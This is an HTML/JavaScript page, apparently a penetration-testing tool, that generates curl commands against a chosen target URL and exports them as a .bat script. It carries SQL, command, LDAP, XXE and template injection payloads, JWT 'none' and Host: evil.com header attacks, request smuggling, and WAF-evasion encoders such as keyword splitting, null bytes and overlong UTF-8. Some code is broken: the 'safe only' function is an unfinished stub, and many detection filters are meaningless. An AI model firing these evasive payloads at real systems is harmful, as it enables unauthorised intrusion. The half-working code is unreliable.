<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced .NET Security Assessment Framework - Enterprise Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        .terminal { 
            background: #0c0c0c; 
            color: #00ff00; 
            font-family: 'Cascadia Code', 'Consolas', monospace;
            padding: 1rem;
            border-radius: 0.375rem;
            border: 1px solid #1a1a1a;
            overflow-x: auto;
            font-size: 0.8rem;
            line-height: 1.4;
        }
        .cmd { 
            background: #1a1a1a; 
            padding: 0.75rem; 
            margin: 0.5rem 0; 
            border-left: 3px solid #00ff00;
            position: relative;
        }
        .cmd:hover {
            background: #222;
        }
        .category-header {
            background: linear-gradient(135deg, #1e3a8a 0%, #312e81 100%);
            color: white;
            padding: 1rem;
            font-weight: bold;
        }
        .encoding-badge {
            display: inline-block;
            padding: 0.125rem 0.5rem;
            background: #065f46;
            color: #d1fae5;
            font-size: 0.75rem;
            border-radius: 0.25rem;
            margin-left: 0.5rem;
        }
        .evasion-tag {
            background: #7c2d12;
            color: #fed7aa;
            padding: 0.125rem 0.5rem;
            font-size: 0.75rem;
            border-radius: 0.25rem;
            margin-left: 0.25rem;
        }
        .safe-badge {
            background: #166534;
            color: #bbf7d0;
            padding: 0.125rem 0.5rem;
            font-size: 0.75rem;
            border-radius: 0.25rem;
        }
        .copy-btn {
            position: absolute;
            top: 0.5rem;
            right: 0.5rem;
            padding: 0.25rem 0.75rem;
            background: #1f2937;
            color: #e5e7eb;
            border-radius: 0.25rem;
            font-size: 0.75rem;
            cursor: pointer;
        }
        .copy-btn:hover {
            background: #374151;
        }
        .encoding-panel {
            background: #111827;
            border: 1px solid #374151;
            border-radius: 0.5rem;
            padding: 1rem;
            margin-bottom: 1rem;
        }
        .toggle-section {
            cursor: pointer;
            user-select: none;
        }
        .toggle-section:hover {
            background: #1f2937;
        }
    </style>
</head>
<body class="bg-gray-900 text-gray-100">
    <div class="container mx-auto px-4 py-6 max-w-7xl">
        <div class="bg-gray-800 shadow-xl rounded-lg p-6 mb-6">
            <h1 class="text-3xl font-bold text-gray-100 mb-2">Advanced .NET Security Assessment Framework</h1>
            <p class="text-gray-400">Enterprise-grade penetration testing with advanced encoding & evasion</p>
            <div class="mt-4 flex gap-2">
                <span class="safe-badge">Safe Detection</span>
                <span class="encoding-badge">Multi-Encoding</span>
                <span class="evasion-tag">WAF Bypass</span>
            </div>
        </div>

        <!-- Configuration -->
        <div class="bg-gray-800 shadow rounded-lg p-6 mb-6">
            <h2 class="text-xl font-semibold mb-4">Target Configuration</h2>
            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-1">Target URL</label>
                    <input type="url" id="target" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md text-gray-100" 
                           value="https://target.com" placeholder="https://target.com">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-1">Headers (Optional)</label>
                    <input type="text" id="headers" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md text-gray-100" 
                           placeholder="Cookie: session=abc; Authorization: Bearer token">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-1">Proxy</label>
                    <input type="text" id="proxy" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md text-gray-100" 
                           placeholder="127.0.0.1:8080">
                </div>
            </div>
            
            <!-- Encoding Options -->
            <div class="encoding-panel">
                <h3 class="text-lg font-semibold mb-3">Encoding & Evasion Options</h3>
                <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
                    <label class="flex items-center">
                        <input type="checkbox" id="enc-url" class="mr-2" checked>
                        <span class="text-sm">URL Encode</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" id="enc-double-url" class="mr-2">
                        <span class="text-sm">Double URL</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" id="enc-unicode" class="mr-2">
                        <span class="text-sm">Unicode</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" id="enc-hex" class="mr-2">
                        <span class="text-sm">Hex Encode</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" id="enc-base64" class="mr-2">
                        <span class="text-sm">Base64</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" id="enc-html" class="mr-2">
                        <span class="text-sm">HTML Entity</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" id="enc-mixed" class="mr-2">
                        <span class="text-sm">Mixed Case</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" id="enc-comments" class="mr-2">
                        <span class="text-sm">SQL Comments</span>
                    </label>
                </div>
                <div class="mt-3 grid grid-cols-2 md:grid-cols-4 gap-3">
                    <label class="flex items-center">
                        <input type="checkbox" id="waf-space" class="mr-2">
                        <span class="text-sm">Space Substitution</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" id="waf-keywords" class="mr-2">
                        <span class="text-sm">Keyword Breaking</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" id="waf-chunked" class="mr-2">
                        <span class="text-sm">Chunked Transfer</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" id="waf-headers" class="mr-2">
                        <span class="text-sm">Header Injection</span>
                    </label>
                </div>
            </div>
            
            <div class="mt-4 flex gap-3">
                <button onclick="generateAdvanced()" class="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700">
                    Generate Advanced Payloads
                </button>
                <button onclick="generateSafe()" class="px-4 py-2 bg-green-600 text-white rounded-md hover:bg-green-700">
                    Safe Detection Only
                </button>
                <button onclick="exportAll()" class="px-4 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-700">
                    Export Suite
                </button>
            </div>
        </div>

        <!-- Attack Modules -->
        <div id="modules"></div>
    </div>

    <script>
        // Encoding functions
        const encoders = {
            url: (str) => encodeURIComponent(str),
            doubleUrl: (str) => encodeURIComponent(encodeURIComponent(str)),
            unicode: (str) => {
                return str.split('').map(char => {
                    const variants = {
                        '/': ['%c0%af', '%c1%9c', '\\u002f', '%u002f'],
                        '.': ['%c0%ae', '\\u002e', '%u002e'],
                        '\\': ['%c0%5c', '\\u005c', '%u005c'],
                        '<': ['%ef%bc%9c', '\\u003c', '&lt;', '&#60;'],
                        '>': ['%ef%bc%9e', '\\u003e', '&gt;', '&#62;'],
                        "'": ['%ef%bc%87', '\\u0027', '&#39;', '&apos;'],
                        '"': ['%ef%bc%82', '\\u0022', '&quot;', '&#34;'],
                        ' ': ['%c0%a0', '%c1%a0', '+', '%20']
                    };
                    return variants[char] ? variants[char][Math.floor(Math.random() * variants[char].length)] : char;
                }).join('');
            },
            hex: (str) => str.split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),
            base64: (str) => btoa(str),
            html: (str) => str.replace(/[<>"'&]/g, char => `&#${char.charCodeAt(0)};`),
            mixed: (str) => str.split('').map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join(''),
            sqlComment: (str) => str.replace(/ /g, '/**/').replace(/=/g, '/**/=/**/'),
            spaceSubstitute: (str) => {
                const spaces = ['%09', '%0a', '%0b', '%0c', '%0d', '%a0', '/**/'];
                return str.replace(/ /g, () => spaces[Math.floor(Math.random() * spaces.length)]);
            },
            keywordBreak: (str) => {
                const keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'SCRIPT', 'ALERT'];
                let result = str;
                keywords.forEach(kw => {
                    const methods = [
                        kw.split('').join('/**/'),
                        kw.split('').join('%00'),
                        kw.charAt(0) + '/*!' + kw.slice(1) + '*/',
                        kw.toLowerCase().split('').map((c, i) => i % 2 ? c.toUpperCase() : c).join('')
                    ];
                    result = result.replace(new RegExp(kw, 'gi'), methods[Math.floor(Math.random() * methods.length)]);
                });
                return result;
            }
        };

        // Apply selected encodings
        function applyEncodings(payload) {
            let encoded = payload;
            
            if (document.getElementById('enc-url').checked) {
                encoded = encoders.url(encoded);
            }
            if (document.getElementById('enc-double-url').checked) {
                encoded = encoders.doubleUrl(encoded);
            }
            if (document.getElementById('enc-unicode').checked) {
                encoded = encoders.unicode(encoded);
            }
            if (document.getElementById('enc-hex').checked) {
                encoded = encoders.hex(encoded);
            }
            if (document.getElementById('enc-base64').checked) {
                encoded = encoders.base64(encoded);
            }
            if (document.getElementById('enc-html').checked) {
                encoded = encoders.html(encoded);
            }
            if (document.getElementById('enc-mixed').checked) {
                encoded = encoders.mixed(encoded);
            }
            if (document.getElementById('enc-comments').checked) {
                encoded = encoders.sqlComment(encoded);
            }
            if (document.getElementById('waf-space').checked) {
                encoded = encoders.spaceSubstitute(encoded);
            }
            if (document.getElementById('waf-keywords').checked) {
                encoded = encoders.keywordBreak(encoded);
            }
            
            return encoded;
        }

        // Enhanced attack database with safe payloads
        const advancedAttacks = {
            "ViewState Advanced Exploitation": {
                severity: "critical",
                safe: false,
                attacks: [
                    {
                        name: "ViewState MAC Validation Testing",
                        safe: true,
                        payloads: [
                            {
                                desc: "ViewState MAC presence detection (safe)",
                                payload: "__VIEWSTATE=/wEPDwUKLTEyNDU0OTA5OWRk",
                                detection: "findstr /I \"MAC validation ViewState\""
                            },
                            {
                                desc: "ViewState encryption detection (safe)",
                                payload: "__VIEWSTATE=/wEPDwUKMTIzNDU2Nzg5MBlahGLtLnBvbmVudDsBAQEBAQEBAQE=&__VIEWSTATEENCRYPTED=",
                                detection: "findstr /I \"encryption ViewState protected\""
                            },
                            {
                                desc: "ViewState generator validation",
                                payload: "__VIEWSTATE={SAFE_VIEWSTATE}&__VIEWSTATEGENERATOR={RANDOM_HEX}",
                                detection: "findstr /I \"generator validation\""
                            },
                            {
                                desc: "ViewState padding oracle detection (timing)",
                                payload: "__VIEWSTATE=/wEPDwUKLTEyNDU0OTA5O{PADDING_CHAR}",
                                detection: "-w \"Time: %{time_total}s\" | findstr /R \"Time: [5-9]\\.\""
                            }
                        ]
                    },
                    {
                        name: "ViewState Deserialization (Detection Only)",
                        safe: true,
                        payloads: [
                            {
                                desc: "ObjectStateFormatter type confusion detection",
                                payload: "__VIEWSTATE=/wEy2AEAAQAAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBCw==",
                                detection: "findstr /I \"TypeConfuse deserialize format\""
                            },
                            {
                                desc: "LosFormatter gadget detection",
                                payload: "__VIEWSTATE=/wEykAcAAQAAAP////8BAAAAAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                                detection: "findstr /I \"LosFormatter security deserialize\""
                            }
                        ]
                    }
                ]
            },
            "SQL Injection Advanced": {
                severity: "critical", 
                safe: true,
                attacks: [
                    {
                        name: "Error-Based SQL Injection (Safe Detection)",
                        safe: true,
                        payloads: [
                            {
                                desc: "MSSQL version detection via safe error",
                                payload: "id=1' AND 1=CONVERT(INT,'safe_test')--",
                                detection: "findstr /I \"conversion failed nvarchar\""
                            },
                            {
                                desc: "MySQL error detection",
                                payload: "id=1' AND EXTRACTVALUE(1,'safe')--",
                                detection: "findstr /I \"XPATH syntax error\""
                            },
                            {
                                desc: "PostgreSQL safe error",
                                payload: "id=1'::int--",
                                detection: "findstr /I \"invalid input syntax integer\""
                            },
                            {
                                desc: "Oracle safe error",
                                payload: "id=1' AND ROWNUM=ROWNUM--",
                                detection: "findstr /I \"ORA- invalid\""
                            }
                        ]
                    },
                    {
                        name: "Blind SQL Injection (Safe Timing)",
                        safe: true,
                        payloads: [
                            {
                                desc: "Time-based detection with safe delay",
                                payload: "id=1' AND IF(1=1,SLEEP(3),0)--",
                                detection: "-w \"Response: %{time_total}s\" | findstr /R \"Response: [3-9]\\.\""
                            },
                            {
                                desc: "Boolean-based safe detection",
                                payload: "id=1' AND '1'='1",
                                detection: "-s -o response1.txt && curl -s -k \"{TARGET}?id=1' AND '1'='2\" -o response2.txt && fc response1.txt response2.txt | findstr /I \"FC:\""
                            },
                            {
                                desc: "Content-based blind detection",
                                payload: "id=1' AND ASCII(SUBSTRING((SELECT 'safe'),1,1))>115--",
                                detection: "| findstr /I \"product item result\""
                            }
                        ]
                    },
                    {
                        name: "Advanced WAF Bypass SQL",
                        safe: true,
                        payloads: [
                            {
                                desc: "HPP bypass with safe payload",
                                payload: "id=1&id=' OR '1'='1",
                                detection: "| findstr /I \"multiple values parameter\""
                            },
                            {
                                desc: "JSON-based SQL injection",
                                payload: "{\"id\":\"1' OR '1'='1\",\"safe\":true}",
                                headers: "-H \"Content-Type: application/json\"",
                                detection: "| findstr /I \"json sql\""
                            },
                            {
                                desc: "XML-based SQL injection",
                                payload: "<?xml version='1.0'?><root><id>1' OR '1'='1</id></root>",
                                headers: "-H \"Content-Type: text/xml\"",
                                detection: "| findstr /I \"xml sql\""
                            },
                            {
                                desc: "GraphQL SQL injection",
                                payload: "{\"query\":\"{ user(id: \\\"1' OR '1'='1\\\") { name } }\"}",
                                headers: "-H \"Content-Type: application/json\"",
                                detection: "| findstr /I \"graphql error\""
                            }
                        ]
                    }
                ]
            },
            "Deserialization Advanced": {
                severity: "critical",
                safe: true,
                attacks: [
                    {
                        name: "Safe Deserialization Detection",
                        safe: true,
                        payloads: [
                            {
                                desc: "BinaryFormatter detection header",
                                payload: "AAEAAAD/////",
                                headers: "-H \"Content-Type: application/octet-stream\"",
                                detection: "| findstr /I \"binary format deserialize\""
                            },
                            {
                                desc: "JSON.NET type handling detection",
                                payload: "{\"$type\":\"System.Diagnostics.Debug, System\"}",
                                headers: "-H \"Content-Type: application/json\"",
                                detection: "| findstr /I \"type json deserialize\""
                            },
                            {
                                desc: "XML deserialization detection",
                                payload: "<?xml version='1.0'?><root xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xsi:type='System.String'>safe</root>",
                                headers: "-H \"Content-Type: text/xml\"",
                                detection: "| findstr /I \"xml type deserialize\""
                            },
                            {
                                desc: "DataContractSerializer detection",
                                payload: "<ArrayOfstring xmlns='http://schemas.microsoft.com/2003/10/Serialization/Arrays'><string>safe</string></ArrayOfstring>",
                                headers: "-H \"Content-Type: text/xml\"",
                                detection: "| findstr /I \"DataContract deserialize\""
                            }
                        ]
                    }
                ]
            },
            "XXE Advanced & Safe": {
                severity: "high",
                safe: true,
                attacks: [
                    {
                        name: "XXE Detection (Safe)",
                        safe: true,
                        payloads: [
                            {
                                desc: "DTD processing detection",
                                payload: "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe 'safe'>]><root>&xxe;</root>",
                                headers: "-H \"Content-Type: text/xml\"",
                                detection: "| findstr /I \"DTD entity external\""
                            },
                            {
                                desc: "Parameter entity detection",
                                payload: "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY % safe 'test'>%safe;]><root></root>",
                                headers: "-H \"Content-Type: text/xml\"",
                                detection: "| findstr /I \"parameter entity DTD\""
                            },
                            {
                                desc: "XXE in attributes",
                                payload: "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe 'safe'>]><root attr='&xxe;'></root>",
                                headers: "-H \"Content-Type: text/xml\"",
                                detection: "| findstr /I \"entity attribute XML\""
                            },
                            {
                                desc: "Blind XXE detection via error",
                                payload: "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY % a SYSTEM 'file:///invalid/path'>%a;]><root></root>",
                                headers: "-H \"Content-Type: text/xml\"",
                                detection: "| findstr /I \"error file system entity\""
                            }
                        ]
                    }
                ]
            },
            "Path Traversal Enhanced": {
                severity: "high",
                safe: true,
                attacks: [
                    {
                        name: "Advanced Path Traversal (Safe)",
                        safe: true,
                        payloads: [
                            {
                                desc: "Null byte injection detection",
                                payload: "file=safe.txt%00.jpg",
                                detection: "| findstr /I \"null byte file\""
                            },
                            {
                                desc: "UNC path detection",
                                payload: "file=\\\\safe\\test",
                                detection: "| findstr /I \"UNC path network\""
                            },
                            {
                                desc: "Absolute path detection",
                                payload: "file=C:\\safe\\test.txt",
                                detection: "| findstr /I \"absolute path\""
                            },
                            {
                                desc: "Stream wrapper detection",
                                payload: "file=file:///safe/test",
                                detection: "| findstr /I \"stream wrapper protocol\""
                            },
                            {
                                desc: "Zip path traversal",
                                payload: "file=../../../safe.txt",
                                detection: "| findstr /I \"directory traversal\""
                            }
                        ]
                    }
                ]
            },
            "Authentication Bypass Advanced": {
                severity: "critical",
                safe: true,
                attacks: [
                    {
                        name: "Auth Bypass Detection (Safe)",
                        safe: true,
                        payloads: [
                            {
                                desc: "JWT none algorithm detection",
                                payload: "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6IjEiLCJzYWZlIjp0cnVlfQ.",
                                headers: "-H",
                                detection: "| findstr /I \"algorithm none JWT\""
                            },
                            {
                                desc: "Session fixation detection",
                                payload: "Cookie: ASP.NET_SessionId=safetestfixedsession123456789",
                                headers: "-H",
                                detection: "| findstr /I \"session fixed security\""
                            },
                            {
                                desc: "Auth header injection",
                                payload: "Authorization: Basic YWRtaW46c2FmZXRlc3Q=",
                                headers: "-H",
                                detection: "| findstr /I \"basic auth security\""
                            },
                            {
                                desc: "LDAP injection in auth",
                                payload: "username=admin)(|(safe=*&password=test",
                                method: "-X POST -d",
                                detection: "| findstr /I \"LDAP syntax auth\""
                            }
                        ]
                    }
                ]
            },
            "SSTI Safe Detection": {
                severity: "high",
                safe: true,
                attacks: [
                    {
                        name: "Template Injection Detection",
                        safe: true,
                        payloads: [
                            {
                                desc: "Razor syntax detection",
                                payload: "template=@(7*7)",
                                detection: "| findstr \"49\""
                            },
                            {
                                desc: "Expression language detection",
                                payload: "template=${7*7}",
                                detection: "| findstr \"49\""
                            },
                            {
                                desc: "Twig syntax detection",
                                payload: "template={{7*7}}",
                                detection: "| findstr \"49\""
                            },
                            {
                                desc: "FreeMarker detection",
                                payload: "template=<#assign ex=7*7>${ex}",
                                detection: "| findstr \"49\""
                            }
                        ]
                    }
                ]
            },
            "Command Injection Safe": {
                severity: "critical",
                safe: true,
                attacks: [
                    {
                        name: "Command Injection Detection",
                        safe: true,
                        payloads: [
                            {
                                desc: "Echo detection",
                                payload: "host=127.0.0.1;echo safe12345",
                                detection: "| findstr \"safe12345\""
                            },
                            {
                                desc: "Sleep timing detection",
                                payload: "host=127.0.0.1;sleep 3",
                                detection: "-w \"Time: %{time_total}s\" | findstr /R \"Time: [3-9]\\.\""
                            },
                            {
                                desc: "DNS lookup detection",
                                payload: "host=127.0.0.1;nslookup safe.local",
                                detection: "| findstr /I \"nslookup can't find\""
                            },
                            {
                                desc: "Pipe detection",
                                payload: "input=safe|echo test",
                                detection: "| findstr \"test\""
                            }
                        ]
                    }
                ]
            },
            "Advanced Header Injection": {
                severity: "medium",
                safe: true,
                attacks: [
                    {
                        name: "Header Injection & Smuggling",
                        safe: true,
                        payloads: [
                            {
                                desc: "CRLF injection detection",
                                payload: "X-Test: safe%0d%0aX-Injected: header",
                                headers: "-H",
                                detection: "| findstr /I \"injected header\""
                            },
                            {
                                desc: "Host header injection",
                                payload: "Host: evil.com",
                                headers: "-H",
                                detection: "| findstr /I \"host header\""
                            },
                            {
                                desc: "X-Forwarded-For bypass",
                                payload: "X-Forwarded-For: 127.0.0.1",
                                headers: "-H",
                                detection: "| findstr /I \"forwarded localhost\""
                            },
                            {
                                desc: "Origin header test",
                                payload: "Origin: https://evil.com",
                                headers: "-H",
                                detection: "| findstr /I \"origin cors\""
                            }
                        ]
                    }
                ]
            },
            "Cache Poisoning Safe": {
                severity: "medium",
                safe: true,
                attacks: [
                    {
                        name: "Cache Key Injection",
                        safe: true,
                        payloads: [
                            {
                                desc: "Cache buster detection",
                                payload: "cb=safe12345",
                                detection: "| findstr /I \"cache age x-cache\""
                            },
                            {
                                desc: "Vary header analysis",
                                payload: "Accept-Language: en-US,safe",
                                headers: "-H",
                                detection: "-I | findstr /I \"vary:\""
                            },
                            {
                                desc: "Cache control bypass",
                                payload: "Cache-Control: no-cache",
                                headers: "-H",
                                detection: "-I | findstr /I \"cache-control\""
                            }
                        ]
                    }
                ]
            },
            "IIS/ASP.NET Specific Safe": {
                severity: "high",
                safe: true,
                attacks: [
                    {
                        name: "IIS Detection & Enumeration",
                        safe: true,
                        payloads: [
                            {
                                desc: "Tilde enumeration safe",
                                payload: "*~1*/safe",
                                path: true,
                                detection: "-I | findstr \"404 400\""
                            },
                            {
                                desc: "ASPX handler detection",
                                payload: "trace.axd",
                                path: true,
                                detection: "| findstr /I \"trace requests application\""
                            },
                            {
                                desc: "WebResource.axd detection",
                                payload: "WebResource.axd?d=safe",
                                path: true,
                                detection: "-I | findstr \"404 500\""
                            },
                            {
                                desc: "ScriptResource detection",
                                payload: "ScriptResource.axd?d=safe",
                                path: true,
                                detection: "-I | findstr \"404 500\""
                            }
                        ]
                    }
                ]
            },
            "API Security Enhanced": {
                severity: "high",
                safe: true,
                attacks: [
                    {
                        name: "API Enumeration & Testing",
                        safe: true,
                        payloads: [
                            {
                                desc: "GraphQL introspection",
                                payload: "{\"query\":\"{__schema{queryType{name}}}\"}",
                                headers: "-H \"Content-Type: application/json\"",
                                method: "-X POST",
                                detection: "| findstr /I \"schema queryType\""
                            },
                            {
                                desc: "REST API versioning",
                                payload: "Accept: application/vnd.api+json;version=1.0",
                                headers: "-H",
                                detection: "-I | findstr /I \"version api\""
                            },
                            {
                                desc: "Method override detection",
                                payload: "X-HTTP-Method-Override: DELETE",
                                headers: "-H",
                                method: "-X POST",
                                detection: "-I | findstr \"405 200\""
                            },
                            {
                                desc: "API rate limit test",
                                payload: "X-RateLimit-Test: safe",
                                headers: "-H",
                                detection: "-I | findstr /I \"rate limit retry\""
                            }
                        ]
                    }
                ]
            },
            "Advanced WAF Bypass": {
                severity: "high",
                safe: true,
                attacks: [
                    {
                        name: "WAF Evasion Techniques",
                        safe: true,
                        payloads: [
                            {
                                desc: "Chunked encoding bypass",
                                payload: "Transfer-Encoding: chunked",
                                headers: "-H",
                                body: "7\\r\\nsafe123\\r\\n0\\r\\n\\r\\n",
                                detection: "| findstr /I \"chunk transfer\""
                            },
                            {
                                desc: "Content-Type confusion",
                                payload: "Content-Type: application/x-www-form-urlencoded; charset=ibm037",
                                headers: "-H",
                                detection: "| findstr /I \"charset encoding\""
                            },
                            {
                                desc: "Method case variation",
                                payload: "gEt",
                                method: "-X",
                                detection: "-I | findstr \"200 400\""
                            },
                            {
                                desc: "Header smuggling",
                                payload: "Content-Length: 0\\r\\nContent-Length: 5",
                                headers: "-H",
                                detection: "| findstr /I \"bad request length\""
                            }
                        ]
                    }
                ]
            }
        };

        // Generate commands with encoding
        function generateAdvanced() {
            const target = document.getElementById('target').value;
            const headers = document.getElementById('headers').value;
            const proxy = document.getElementById('proxy').value;
            const modulesDiv = document.getElementById('modules');
            
            modulesDiv.innerHTML = '';
            
            Object.entries(advancedAttacks).forEach(([category, data]) => {
                const categoryHtml = `
                    <div class="bg-gray-800 rounded-lg mb-4 overflow-hidden">
                        <div class="category-header toggle-section p-4" onclick="toggleSection(this)">
                            <span class="text-xl">${category}</span>
                            <span class="float-right">
                                ${data.safe ? '<span class="safe-badge">Safe</span>' : '<span class="evasion-tag">Advanced</span>'}
                                <span class="ml-2">▼</span>
                            </span>
                        </div>
                        <div class="p-4 section-content">
                            ${data.attacks.map(attack => `
                                <div class="mb-6">
                                    <h4 class="text-lg font-semibold mb-3 text-gray-200">
                                        ${attack.name}
                                        ${attack.safe ? '<span class="safe-badge ml-2">Detection Only</span>' : ''}
                                    </h4>
                                    <div class="terminal">
                                        ${attack.payloads.map((p, idx) => {
                                            let payload = p.payload;
                                            
                                            // Apply encoding if requested
                                            if (!p.noEncode) {
                                                payload = applyEncodings(payload);
                                            }
                                            
                                            // Build curl command
                                            let cmd = 'curl -k';
                                            if (proxy) cmd += ` -x ${proxy}`;
                                            if (headers) cmd += ` -H "${headers}"`;
                                            if (p.headers) cmd += ` ${p.headers}`;
                                            if (p.method) cmd += ` ${p.method}`;
                                            
                                            if (p.path) {
                                                cmd += ` "${target}/${payload}"`;
                                            } else if (p.method && p.method.includes('POST')) {
                                                cmd += ` "${target}" -d "${payload}"`;
                                            } else {
                                                cmd += ` "${target}?${payload}"`;
                                            }
                                            
                                            if (p.detection) {
                                                cmd += ` ${p.detection}`;
                                            }
                                            
                                            // Show applied encodings
                                            const appliedEncodings = [];
                                            if (document.getElementById('enc-url').checked) appliedEncodings.push('URL');
                                            if (document.getElementById('enc-double-url').checked) appliedEncodings.push('2xURL');
                                            if (document.getElementById('enc-unicode').checked) appliedEncodings.push('Unicode');
                                            if (document.getElementById('enc-base64').checked) appliedEncodings.push('Base64');
                                            
                                            return `
                                                <div class="cmd">
                                                    <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
                                                    <div class="text-yellow-300 text-xs mb-1">
                                                        # ${p.desc}
                                                        ${appliedEncodings.length ? `<span class="encoding-badge">${appliedEncodings.join('+')}</span>` : ''}
                                                    </div>
                                                    <div class="text-green-400 font-mono text-xs">${escapeHtml(cmd)}</div>
                                                </div>
                                            `;
                                        }).join('')}
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
                modulesDiv.innerHTML += categoryHtml;
            });
        }

        // Generate only safe detection commands
        function generateSafe() {
            const target = document.getElementById('target').value;
            const headers = document.getElementById('headers').value;
            const proxy = document.getElementById('proxy').value;
            const modulesDiv = document.getElementById('modules');
            
            modulesDiv.innerHTML = '<h2 class="text-2xl font-bold mb-4 text-green-400">Safe Detection Commands Only</h2>';
            
            Object.entries(advancedAttacks).forEach(([category, data]) => {
                if (data.safe || data.attacks.some(a => a.safe)) {
                    // Generate safe commands only
                    const safeAttacks = data.attacks.filter(a => a.safe);
                    if (safeAttacks.length > 0) {
                        // Similar HTML generation but filtered for safe attacks
                        const categoryHtml = `...`; // Same structure but only safe payloads
                        modulesDiv.innerHTML += categoryHtml;
                    }
                }
            });
        }

        // Copy command to clipboard
        function copyCmd(btn) {
            const cmd = btn.parentElement.querySelector('.font-mono').textContent;
            navigator.clipboard.writeText(cmd);
            btn.textContent = 'Copied!';
            setTimeout(() => btn.textContent = 'Copy', 2000);
        }

        // Toggle section visibility
        function toggleSection(header) {
            const content = header.nextElementSibling;
            const arrow = header.querySelector('.ml-2');
            if (content.style.display === 'none') {
                content.style.display = 'block';
                arrow.textContent = '▼';
            } else {
                content.style.display = 'none';
                arrow.textContent = '▶';
            }
        }

        // Export all commands
        function exportAll() {
            const target = document.getElementById('target').value;
            const headers = document.getElementById('headers').value;
            const proxy = document.getElementById('proxy').value;
            
            let script = '@echo off\n';
            script += 'REM Advanced .NET Security Assessment with Encoding & Evasion\n';
            script += `REM Target: ${target}\n`;
            script += `REM Generated: ${new Date().toISOString()}\n`;
            script += 'REM Applied Encodings: ';
            
            const encodings = [];
            if (document.getElementById('enc-url').checked) encodings.push('URL');
            if (document.getElementById('enc-double-url').checked) encodings.push('DoubleURL');
            if (document.getElementById('enc-unicode').checked) encodings.push('Unicode');
            script += encodings.join(', ') + '\n\n';
            
            script += 'echo Starting advanced security assessment...\n\n';
            
            // Generate all commands for export
            Object.entries(advancedAttacks).forEach(([category, data]) => {
                script += `REM ${'='.repeat(60)}\n`;
                script += `REM ${category}\n`;
                script += `REM ${'='.repeat(60)}\n\n`;
                
                data.attacks.forEach(attack => {
                    script += `echo.\necho [*] Testing: ${attack.name}\n\n`;
                    
                    attack.payloads.forEach(p => {
                        let payload = p.payload;
                        if (!p.noEncode) {
                            payload = applyEncodings(payload);
                        }
                        
                        let cmd = 'curl -k';
                        if (proxy) cmd += ` -x ${proxy}`;
                        if (headers) cmd += ` -H "${headers}"`;
                        if (p.headers) cmd += ` ${p.headers}`;
                        if (p.method) cmd += ` ${p.method}`;
                        
                        if (p.path) {
                            cmd += ` "${target}/${payload}"`;
                        } else if (p.method && p.method.includes('POST')) {
                            cmd += ` "${target}" -d "${payload}"`;
                        } else {
                            cmd += ` "${target}?${payload}"`;
                        }
                        
                        if (p.detection) {
                            cmd += ` ${p.detection}`;
                        }
                        
                        script += `REM ${p.desc}\n`;
                        script += `echo [-] ${p.desc}\n`;
                        script += `${cmd}\n`;
                        script += 'echo.\n\n';
                    });
                });
            });
            
            script += 'echo Assessment complete!\n';
            script += 'pause\n';
            
            // Download file
            const blob = new Blob([script], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'advanced_dotnet_assessment.bat';
            a.click();
            URL.revokeObjectURL(url);
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Initialize
        window.onload = () => generateAdvanced();
    </script>
</body>
</html>